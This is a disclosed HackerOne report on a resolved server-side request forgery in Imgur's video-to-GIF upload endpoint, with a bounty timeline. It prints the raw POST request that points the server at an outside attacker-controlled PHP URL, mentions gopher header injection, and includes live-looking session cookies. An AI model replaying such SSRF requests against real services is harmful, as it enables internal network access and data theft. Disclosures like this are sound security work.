---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2020-08-13
submitted: 2017-07-10T11:16:05.097Z
bounty_usd: null
votes: 28
cve: []
program: "[[programs/imgur|Imgur]]"
reporter: "mariuszdeepsec"
source: "https://hackerone.com/reports/247680"
title: "SSRF in imgur video GIF conversion"
---
# SSRF in imgur video GIF conversion

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 28 | **Program:** Imgur | **Disclosed:** 2020-08-13

- Report: [https://hackerone.com/reports/247680](https://hackerone.com/reports/247680)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2017-07-10T11:16:05.097Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,

There was issue in -> https://hackerone.com/reports/115748

We have found similar one but in next steps

Affected request
============================
```
POST /vidgif/upload HTTP/1.1
Host: imgur.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://imgur.com/vidgif/video/between/56.72/9.71?url=http%3A%2F%2Fwww.onirikal.com%2Fvideos%2Fmp4%2Fbattle_games.mp4
Content-Length: 127
Cookie: SESSIONDATA=%7B%22sessionCount%22%3A3%2C%22sessionTime%22%3A1499684317408%7D; IMGURUIDJAFO=7450708ff93583b3772a3048e340856d59cef648c4dab74c825a83be56c807ab; _ga=GA1.2.1311247514.1499605938; _gid=GA1.2.2061092166.1499605938; __qca=P0-831392639-1499605938609; expPLAT51a=control; AZUSER=ue1-50873ccaac994527ac520cd62b5901e7; __gads=ID=1eb1b9c53a665ffd:T=1499605915:S=ALNI_MaUwqVKMDz-uAhHuqAQFc2_ajTK2Q; m_sort=viral; m_window=day; m_section=hot; __utma=247341212.1311247514.1499605938.1499607069.1499674066.2; __utmz=247341212.1499607069.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); c_sort=newest; c_window=day; __atuvc=2%7C28; GCS=top; authautologin=17d1c9dc6b5e4b318c27ca4b85921a90%7EVJ3S8CJDeJgyKiUlrdYxGzQ99xkZiEox; _nc=1; f_sort=newest; f_section=favorites; retina=0; OX_plg=swf|shk|pm; UPSERVERID=upload.i-083e69b6391b5191e.production; __utmc=247341212; IMGURSESSION=5c493a419036f493aa69b0b40d8b1f28; __cfduid=d5d1746c7fcc97ff5c333cae83ce89d571499673731; showComments=1; c1069960587=1
Connection: close

source=http%3A%2F%2F192.166.218.53%2Fmalicious123.php&url=http%3A%2F%2F192.166.218.53%2Fmalicious123.php&start=56.72&stop=66.43
```


PoC
======================
HTTP Requests
-------------------------
{F201616}
FTP Requests
-------------------------
{F201614}


And most important like in the old vulnerable spot gopher where attacker have posibilities to inject stuff in headers with usse of %0a
-------------------------
{F201615}

Sorry for short description i assume u already know what SSRF is as u fixed previous vulnerable spot, if something is not clear feel free to ask
-------------------------------------------------

## Timeline

- **Report Filed**
- **2017-07-10** @Imgur: Hello! Thanks for taking the time to make this report to the Imgur security team! We look forward to reviewing and assessing the risk of this vuln. In the meantime, we ask that you sit tight while we get to it - we're a small team and sometimes it takes us a while to verify all reports. Please don't ask for updates as these take time and effort away from the reports we're working through and make our response time slower across the board. Thanks - we'll be in touch soon!
- **2017-07-10** @mariuszdeepsec: I saw the raport here -> https://hackerone.com/reports/115857

but this issue is resolved so assumed as fixed, i found out that it isint so i consider this a a security risk and  a vulnerability. Due to a updated ffmpeg i think there is no more local file read so only SSRF exists.
- **2017-07-17** @mariuszdeepsec: @imgur team, any response ?
- **2017-08-14** @mariuszdeepsec: @imgur any first response to the vulnerability?
- **2017-08-14** @mariuszdeepsec: The vulnerability is still presented
{F212507}
- **Report Triaged**
- **Bounty Awarded**
- **2018-01-19** @mariuszdeepsec: ok, hanks for the bounty !
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
